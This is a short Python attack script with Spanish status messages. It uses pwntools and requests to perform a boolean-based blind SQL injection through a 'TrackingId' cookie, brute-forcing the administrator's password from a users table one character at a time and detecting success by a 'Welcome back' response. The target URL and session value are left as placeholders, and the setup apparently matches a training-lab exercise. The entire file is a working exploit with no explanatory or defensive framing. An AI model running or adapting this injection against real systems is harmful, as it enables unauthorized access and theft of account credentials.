#!/usr/bin/env python3

from pwn import *
import requests, sys, signal, string

def def_handler(sig, frame):
    print(f"\n[!] Saliendo...\n")
    p1.failure("Ataque detenido")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits


p1 = log.progress("SQLi")


def makeSQLi():

    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    password = ""

    p2 = log.progress("Password")

    for position in range(1, 21):
        for character in characters:
            cookies = {
                'TrackingId': f"NPOvQ2mmdkPKkeJz' and (select substring(password,{position},1) from users where username='administrator') = '{character}'-- -",
                'session': "<Añadir_valor_de_session>"
            }

            p1.status(cookies["TrackingId"])

            r = requests.get("<Añadir_URL>", cookies=cookies)

            if "Welcome back" in r.text:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':
    makeSQLi()
